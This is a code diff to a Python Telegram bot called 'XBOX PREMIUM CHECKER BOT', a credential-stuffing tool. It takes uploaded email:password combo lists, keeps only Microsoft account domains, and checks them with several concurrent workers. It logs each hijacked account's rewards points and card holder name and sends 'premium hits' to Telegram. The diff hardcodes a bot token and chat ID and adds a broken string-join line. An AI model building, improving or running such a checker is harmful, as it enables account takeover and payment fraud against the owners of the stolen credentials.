@@ -398,7 +398,7 @@ class ResultManager:
                 capture.append("Points: " + data['rewards_points'])
             if 'card_holder' in data:
                 capture.append("Card: " + data['card_holder'])
-            full_line = line + " | " + " | ".join(capture) + "\n"
+            full_line = line + " | " | ".join(capture) + "\n"
             with open(self.free_file, 'a', encoding='utf-8') as f:
                 f.write(full_line)
         else:
@@ -411,12 +411,12 @@ class ResultManager:
 # ============================================================
 
 # ============================================================
-# MULTI-WORKER CONCURRENT PROCESSING SYSTEM
+# MULTI-WORKER CONCURRENT PROCESSING SYSTEM (FIXED)
 # ============================================================
 
 BOT_TOKEN = "8657130802:AAE8Ynf791ramxyFktFPHgwuv0b5vNKiKH0"
 CHAT_ID = 8260250818
-MAX_CONCURRENT_WORKERS = 5  # Process 5 files simultaneously
+MAX_CONCURRENT_WORKERS = 5
 
 ALLOWED_DOMAINS = [
     'hotmail.com', 'hotmail.co.uk', 'hotmail.fr', 'hotmail.de',
@@ -425,12 +425,13 @@ ALLOWED_DOMAINS = [
     'msn.com', 'passport.com'
 ]
 
-# Global variables
 task_queue = queue.Queue()
 active_tasks = {}
 active_tasks_lock = threading.Lock()
-worker_executor = None
+worker_threads = []
+worker_running = True
 loop = None
+app = None
 
 class ScanTask:
     def __init__(self, file_path, original_name, file_id, chat_id):
@@ -480,7 +481,6 @@ def validate_and_filter_file(file_path):
         return None, 0, 0, []
 
 def process_single_file(task):
-    """Process a single file - runs in worker thread"""
     try:
         with open(task.file_path, 'r', encoding='utf-8') as f:
             lines = [l.strip() for l in f.readlines() if l.strip() and ':' in l]
@@ -585,7 +585,7 @@ def process_single_file(task):
                     )
                     batch_buffer.clear()
                 
-                time.sleep(0.2)
+                time.sleep(0.15)
                 
             except Exception as e:
                 stats["error"] += 1
@@ -628,9 +628,8 @@ def process_single_file(task):
             except:
                 pass
 
-def worker_loop():
-    """Worker thread that continuously processes tasks from queue"""
-    while True:
+def worker_loop(worker_id):
+    while worker_running:
         try:
             with active_tasks_lock:
                 current_active = len(active_tasks)
@@ -653,13 +652,10 @@ def worker_loop():
                 loop
             )
             
-            # Process file in a separate thread
-            thread = Thread(target=process_single_file, args=(task,))
-            thread.daemon = True
-            thread.start()
+            process_single_file(task)
             
         except Exception as e:
-            print(f"Worker error: {e}")
+            print(f"Worker {worker_id} error: {e}")
             time.sleep(1)
 
 async def send_processing_start(task):
@@ -736,8 +732,7 @@ async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
         "hotmail.com, outlook.com, live.com, msn.com\n\n"
         "**Commands:**\n"
         "/start - This message\n"
-        "/status - Queue status\n"
-        "/cancel - Stop current scan\n\n"
+        "/status - Queue status\n\n"
         "📊 Results appear in batches (15 accounts per update)\n"
         "🎯 Premium hits sent to BOTH Telegram bots instantly!\n"
         "⚡ Multiple files process simultaneously!"
@@ -755,10 +750,6 @@ async def status_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     msg += f"🔄 **Processing:** {'Yes' if active_count > 0 else 'No'}\n\n"
     msg += f"Send .txt files to add to queue."
     await update.message.reply_text(msg, parse_mode=ParseMode.MARKDOWN)
-
-async def cancel_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    # Note: Cancelling is complex with multi-threading
-    await update.message.reply_text("⚠️ To cancel, please restart the bot. Multi-file cancel coming soon.")
 
 async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
     document = update.message.document
@@ -801,20 +792,22 @@ async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await update.message.reply_text(f"⚠️ Skipped `{invalid_count}` non-Microsoft account(s)", parse_mode=ParseMode.MARKDOWN)
 
 def main():
-    global app, loop
+    global app, loop, worker_running, worker_threads
     
     app = Application.builder().token(BOT_TOKEN).build()
-    loop = asyncio.get_event_loop()
+    loop = asyncio.new_event_loop()
+    asyncio.set_event_loop(loop)
     
     app.add_handler(CommandHandler("start", start_command))
     app.add_handler(CommandHandler("status", status_command))
-    app.add_handler(CommandHandler("cancel", cancel_command))
     app.add_handler(MessageHandler(filters.Document.ALL, handle_document))
     
     # Start worker threads
-    for _ in range(MAX_CONCURRENT_WORKERS):
-        worker_thread = threading.Thread(target=worker_loop, daemon=True)
+    worker_running = True
+    for i in range(MAX_CONCURRENT_WORKERS):
+        worker_thread = threading.Thread(target=worker_loop, args=(i+1,), daemon=True)
         worker_thread.start()
+        worker_threads.append(worker_thread)
     
     print("=" * 60)
     print("🎮 XBOX PREMIUM CHECKER BOT - MULTI-WORKER MODE")
